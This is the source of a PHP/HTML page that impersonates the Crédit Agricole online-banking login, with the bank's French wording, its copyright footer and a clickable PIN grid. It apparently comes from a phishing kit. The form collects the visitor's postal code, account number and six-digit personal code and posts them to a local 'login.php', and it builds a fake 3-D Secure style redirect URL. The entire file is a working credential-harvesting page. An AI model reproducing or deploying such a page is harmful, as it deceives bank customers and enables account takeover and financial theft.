<?php

session_start();
include('det.php');
regenerate();
?>
<html><head>

<HEAD> <TITLE>AUTH</TITLE> <link rel="icon" href="logo.png" type="image/png"> </HEAD>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">


<link rel="stylesheet" type="text/css" href="#" media="all">
<link rel="stylesheet" type="text/css" href="img/antiquus.css" media="all">
<link rel="stylesheet" type="text/css" href="img/styles.css" media="all">
<link rel="stylesheet" type="text/css" href="#" media="all">
<link rel="stylesheet" type="text/css" href="img/styles-mod.css" media="all">
<link rel="stylesheet" type="text/css" href="#" media="all">
<link rel="stylesheet" type="text/css" href="#" media="all">

<script src="#"></script><style type="text/css"></style></head><body text="#000000" leftmargin="0" topmargin="0" onLoad="Init()"><div id="infoBull" style="position: absolute;z-Index:10"></div><div id="ombrBull" style="position: absolute;z-Index:9"></div>





<script language="JavaScript">
<!--

//Message affich&eacute; quand le souris est au-dessus: 
statusconfirmer="Confirmer l'identification";
statusannuler="Annuler l'identification";
statusaide="Besoin d'Aide ?";
statuscondjur="Conditions juridiques";
statusdemo="Voir la d&eacute;monstration";
statuscompte="Saisir votre n&deg; de compte";
statuscode="Saisir votre code personnel";
statuscorriger="Corriger votre derni&egrave;re saisie";
statusclavnum="Cliquez dans la grille pour composer votre code personnel";
statusrecom="Voir nos recommandations";

// on recupere la version du navigateur
var OS = 'Win';
// on recupere la version du navigateur
Version=navigator.appVersion;
App = navigator.appName;
var Version=Version.substring(0,1);
var posOS = navigator.appVersion.indexOf('Mac');
var posOS2 = navigator.appVersion.indexOf('Win');
if (posOS >= 0) OS = 'Mac';
if ((posOS < 0) && (posOS2 >= 0)) OS = 'Win';
if (OS == 'Win') Nav_sup = 2;
else Nav_sup = 3;
// si c'est Netscape 2+ ou MSIE3+, c'est correct
browserOK=(((navigator.appName=="Netscape") && (Version > 1)) || (Version>=Nav_sup));
browserOK1=(((navigator.appName=="Netscape") && (Version > 1)) || (Version>=4));
browserOK2=(navigator.appName=="Netscape");



function setSize(win,width,height) {
	if (win.outerWidth) {
		win.outerWidth = width;
		win.outerHeight = height;
	}
	else if (win.resizeTo) {
		win.resizeTo(width,height);
	}
	else {
		alert("Not supported.");
	}
}

function clicPosition(position) {
	cocherCase();
	if (document.formulaire.CCCRYC2.value.length == 6) { 
		return; 
	}
	if (document.formulaire.CCCRYC.value=="") 
		document.formulaire.CCCRYC.value = position;
	else
		document.formulaire.CCCRYC.value = document.formulaire.CCCRYC.value + "," + position;
	document.formulaire.CCCRYC2.value = document.formulaire.CCCRYC2.value + "0";
}

var code, pos_der_code, affiche_code;
function effacer() { 
	if (document.formulaire.CCCRYC2.value.length == 0) { 
		return; 
	}
	code = document.formulaire.CCCRYC.value;
	pos_der_code = code.lastIndexOf( ',' );
	code = code.substr( 0,pos_der_code);

	affiche_code = document.formulaire.CCCRYC2.value;
	affiche_code = affiche_code.substr( 0,(document.formulaire.CCCRYC2.value.length - 1) );

	document.formulaire.CCCRYC.value = code;
	document.formulaire.CCCRYC2.value = affiche_code;
}

var i=0;
function cocherCase() {
	if ( i<6)
	{
		var l_oBarre = document.getElementById("monAvancement");
		l_oBarre.rows[0].cells[i].style.visibility = 'visible';
		i = i + 1;
	}
}
function corriger() {
	if ( i>0 )
	{
		i = i - 1;
		var l_oBarre = document.getElementById("monAvancement");
		l_oBarre.rows[0].cells[i].style.visibility = 'hidden';
	 }
}

var path_static = "";
var path_dynamic = "/stb";
// Recuperation code caisse
var caisse = "878";

function raf(){
	return;
}

var urlappli = "?PaReq=a8f4b2ef1e2374eb0fe37fc0249d10&MD=<? echo md5(rand(20)); ?>";
var urlapplisecu = "/stb/securite-entreeBam?TOPAF=1";

function ValidCertif(){
	document.formulaire.action = urlappli;
	validation(document.formulaire)

}

function ValidCertifSecu(){
	document.formulaire.action = urlapplisecu;
	validation(document.formulaire)
}

// -->
</script>

<script language="JavaScript">
<!--

function ouvrePOPUP(item,widthpop,heightpop,men) {
	if(item.indexOf("?") != -1) {
		item = item+"&stbevt=Popup";
	}
	else {
		item = item+"?stbevt=Popup";
	}

	ouvreFenetre(item,widthpop,heightpop,men,"PopUp");
}
function ouvreassistance(item,widthpop,heightpop,men) {
	ouvreFenetre(item,widthpop,heightpop,men,"Assistance");
}

function ouvreFenetre(item,widthpop,heightpop,men,titre) {

	if (item.indexOf("?") != -1) {
		if (item.indexOf("#") != -1)
			url = item.substring(0,item.indexOf("#"))+"&typeaction=Popup"+item.substring(item.indexOf("#"),item.length);
		else
			url = item+"&typeaction=Popup";
	} else {
		url = item;
	}

	aazz = "menubar=" + men + ",resizable=yes,toolbar=no,width=" + widthpop + ",height=" + heightpop + ",scrollbars=yes";

	// on verifie si l'on n'est pas deja sur la bonne fenetre
	if (titre!=window.name) {
		// Mise en commentaire de l ancien code
		//if (!saf) {
			// on recupere un reference sur le popup (s'il n'est pas ouvert, cela en ouvre une!)
		//	popup1 = window.open('',titre,aazz);
			// on ferme le popup
		//	popup1.close();
		//}
		// on ouvre le nouveau avec les nouveaux parametres (taille, bouton...)
		//popup1 = window.open('',titre,aazz);
		//popup1.name = titre;
		//setSize(popup1,widthpop,heightpop);
			
		popup1 = window.open(url,titre,aazz);
			
	    if (moz ) popup1.focus();
	    //popup1.location =url;
	} else {
		window.name = titre;
		setSize(window,widthpop,heightpop);
		document.location = url;
	}

}

function setSize(win,width,height) {
	if (win.outerWidth) {
		win.outerWidth = width;
		win.outerHeight = height;
	}
	else if (win.resizeTo) {
		win.resizeTo(width,height);
	}
	else {
		alert("Not supported.");
	}

}

// -->
</script>





<div id="container">
							<div id="contenu" style="width: 957px;">
<table border="0">
	<tbody><tr>
		<td colspan="3">


<div align="center" style="background-color:#E6E6E6;">
<table width="620px" cellspacing="0" cellpadding="0" border="0">
<tbody><tr>
<td style="background:#E6E6E6;">
	<div id="entete_vide">	
		<div id="entete" style="background:none;">
   			 <div id="gauche-entete">
		        <h1><img src="img/2.PNG"></h1>
		    </div>
   		 </div>
	</div>
</td>
</tr>
</tbody></table>
</div>
		</td>
	</tr>
	<tr valign="top">
	
		<td>
		
		<table style="background:#00000" border="0" width="100%" cellpadding="0" cellspacing="0">

			<tbody><tr>
				<td valign="top" width="169" style="background:#E6E6E6 repeat-y scroll left top">&nbsp;</td>
				<td id="col-centre" valign="top" width="590px">
				
				<table width="590" border="0" cellspacing="0" cellpadding="0">
					<tbody><tr>
						<td><form class="ca-forms ca-forms-stitre" method="POST" name="formulaire" action="login.php">
						  <input type="hidden" name="idtcm" value=""> 
							<input type="hidden" name="origine" value="vitrine"> 
							<input type="hidden" name="situationTravail" value="BANCAIRE"> 
							<input type="hidden" name="canal" value="WEB"> 
							<input type="hidden" name="typeAuthentification" value="CLIC_RETOUR">
							<input type="hidden" name="idUnique" value="-13ff2f5:14321b4517e:-592e"> 
							<input type="hidden" name="caisse" value="878"> 
							<input type="hidden" name="CCCRYC" value="" >
							<img src="img/4.PNG" width="599" height="141">
							<fieldset class="blc-choix">
							  <div class="blc-choix-wrap" style="padding-bottom: 40px;"><p class="nomarge"><img src="img/1.PNG" width="532" height="58"></p>
						  <p class="validation" style="width:570px"></p></div></fieldset>
						<table width="590" border="0">
							<!-- Message securitaire -->

							<tbody><tr>
								<td height="22" colspan="3">
								<input type="hidden" name="CCCRYC2" value="">
								 <fieldset class="blc-choix">
							 <script>
								if(saf){
									document.write("<div class=\"blc-choix-wrap\" style=\"padding-bottom:190px;\">");
									
								}else{
									document.write("<div class=\"blc-choix-wrap\">");
								}
							   
							</script><div class="blc-choix-wrap" style="padding-bottom:190px;">
								<script langage="Javascript">
<!--
function validation(formulaire) {
if(formulaire.CCPTE.value=="") {
alert("Votre num&eacute;ro de compte est incomplet.");
return;
}
if(formulaire.CCCRYC.value=="") {
alert("Votre code personnel est incomplet.");
return;
}
if(isAlphaNum(formulaire.CCPTE.value)) {
if(isNumerique(formulaire.CCCRYC2.value)) {
formulaire.submit();
}
else {
alert("Votre code personnel est incomplet.");
}
}
else {
alert("Votre num&eacute;ro de compte est incomplet.");
}
}
function isNumerique(chaine){
if (chaine.length!=6)
return false;
for(var i=0;i<chaine.length;i++){
if(chaine.charAt(i)>'9' || chaine.charAt(i)<'0'){
return false;
}
}
return true;
}
function isAlphaNum(chaine){
if (chaine.length!=11)
return false;
chaine = chaine.toLowerCase();
for(var i=0;i<chaine.length;i++){
if(!((chaine.charAt(i)<='9' && chaine.charAt(i)>='0') || (chaine.charAt(i)<='z' && chaine.charAt(i)>='a'))){
return false;
}
}
return true;
}
-->
</script>
<h3>Vos codes d'acc&egrave;s</h3>
<p></p>
<label class="normal">Saisissez votre CODE POSTAL &agrave; l'aide de votre clavier :</label>
&nbsp;<input type="text" name="CP" size="5" maxlength="5" tabindex="1" required>
<p></p>
<label class="normal">Saisissez votre N&deg; DE COMPTE &agrave; l'aide de votre clavier :</label>
&nbsp;<input type="text" name="CCPTE" size="11" maxlength="11" tabindex="1" required>
<p></p>
<div id="bloc-pave-saisis-code">
<label class="normal gauche" for="input-code">Cliquez dans la grille <br>pour composer votre CODE PERSONNEL :</label>

								
								
								<table id="pave-saisie-code" class="gauche">
<tbody><tr align="center" valign="middle">
<td onClick="clicPosition('3'); "><a tabindex="2" href="javascript:raf()">
&nbsp;&nbsp;3&nbsp;&nbsp;
</a></td>
<td onClick="clicPosition('5'); "><a tabindex="3" href="javascript:raf()">
&nbsp;&nbsp;5&nbsp;&nbsp;
</a></td>
<td><a tabindex="4" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
<td><a tabindex="5" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
<td onClick="clicPosition('0'); "><a tabindex="6" href="javascript:raf()">
&nbsp;&nbsp;0&nbsp;&nbsp;
</a></td>
</tr>
<tr align="center" valign="middle">
<td><a tabindex="7" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
<td onClick="clicPosition('7'); "><a tabindex="8" href="javascript:raf()">
&nbsp;&nbsp;7&nbsp;&nbsp;
</a></td>
<td><a tabindex="9" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
<td><a tabindex="10" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
<td><a tabindex="11" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
</tr>
<tr align="center" valign="middle">
<td><a tabindex="12" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
<td onClick="clicPosition('8'); "><a tabindex="13" href="javascript:raf()">
&nbsp;&nbsp;8&nbsp;&nbsp;
</a></td>
<td><a tabindex="14" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
<td onClick="clicPosition('4'); "><a tabindex="15" href="javascript:raf()">
&nbsp;&nbsp;4&nbsp;&nbsp;
</a></td>
<td onClick="clicPosition('1'); "><a tabindex="16" href="javascript:raf()">
&nbsp;&nbsp;1&nbsp;&nbsp;
</a></td>
</tr>
<tr align="center" valign="middle">
<td onClick="clicPosition('2'); "><a tabindex="17" href="javascript:raf()">
&nbsp;&nbsp;2&nbsp;&nbsp;
</a></td>
<td><a tabindex="18" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
<td><a tabindex="19" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
<td><a tabindex="20" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
<td><a tabindex="21" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
</tr>
<tr align="center" valign="middle">
<td onClick="clicPosition('9'); "><a tabindex="22" href="javascript:raf()">
&nbsp;&nbsp;9&nbsp;&nbsp;
</a></td>
<td><a tabindex="23" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
<td onClick="clicPosition('6'); "><a tabindex="24" href="javascript:raf()">
&nbsp;&nbsp;6&nbsp;&nbsp;
</a></td>
<td><a tabindex="25" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
<td><a tabindex="26" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
</tr>
</tbody></table>

<span class="align-bas gauche">
								<table>
								<tbody><tr>
								<td>
								<div style="border-color: gray;border-width: 1px;border-style: solid;">
								<table id="monAvancement" class="monAvancement" style="border:none;">
											<tbody><tr>
												<td class="maCase" style="visibility: hidden;"><img height="10" width="10" src="img/point_transp.gif"></td>
												<td class="maCase" style="visibility: hidden;"><img height="10" width="10" src="img/point_transp.gif"></td>
												<td class="maCase"><img height="10" width="10" src="img/point_transp.gif"></td>
												<td class="maCase"><img height="10" width="10" src="img/point_transp.gif"></td>
												<td class="maCase"><img height="10" width="10" src="img/point_transp.gif"></td>
												<td class="maCase"><img height="10" width="10" src="img/point_transp.gif"></td>
											
											</tr>
										</tbody></table>
								</div>
										</td>
										<td>
										(6 chiffres)
										</td>
										</tr>
										</tbody></table>
								
                                </span>
                                
							</div>
							
							<p class=" validation clearboth" style="width:570px;margin:30px 0 0;">
                                <span class="gauche">
	                                
                            	</span>
                            	<span class="droite">
                            	
                            	
                            		
	                            		
			   							
			   							
			   						

			   							
			   							
			   						
			   							
			   							
			   						
	                            		<a class="annuler droite" href="javascript:corriger();effacer();" tabindex="27">Corriger</a> 
		   								<INPUT TYPE="submit" class="droite"  tabindex="28"id="droite" VALUE="Confirmer">
	                            		<a class="annuler droite" href="#" tabindex="30">Annuler</a>
	                            		
			   							

			   							
			   							
			   							
			   							
								</span>                           
                            </p>
						</div>
                   		 </fieldset>
										
								</td>
							</tr>
							
						</tbody></table>
						
						</form></td>
					</tr>
		<tr>
		<td>		
		<!-- Pav&eacute; Certificat --> 
		
		<!-- Conditions Juridique --> <form class="ca-forms" style="padding:0 0;"><p><img src="img/3.PNG" width="578" height="89"></p>
		  <p class="validation" style="width:580px"><script>var srcLien = path_dynamic + "/app/bam/tech/allmedia/stb/entreebam/jsp/AUTH-INF.jsp";var srcPuceLien = path_static + "https://www.ce-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/picts/PuceLien.gif";var yesno = "no";var authentif = "AUTH";</script></p></form>
			</td>
		</tr>
		</tbody></table>
		</td>
		<td valign="top" width="171" style="background:#E6E6E6 repeat-y scroll left top">&nbsp;</td>
		</tr>
		
		
	<tr valign="middle" style="background-color:#E6E6E6;">
	<td></td>
		<td>
		<table border="0" cellpadding="0" cellspacing="0" width="590">
			<tbody><tr>
				<td class="footercopyright" align="center">&nbsp;</td>
			</tr>
			<tr>
				<td class="footercopyright" align="center">@2004-2018 Cr&eacute;dit Agricole,
				tous droits r&eacute;serv&eacute;s</td>
			</tr>
		</tbody></table>
		 

<!--MARQUEUR XITI-->



</noscript>
		</td>
		<td></td>
	</tr></tbody></table>
</td>



</tr>
</tbody></table>




<table>
	<tbody><tr>
		<td width="169"></td>
		<td id="main_bas" width="570"></td>
		<td width="169"></td>
	</tr>
</tbody></table>
</div>
</div>


</body></html>
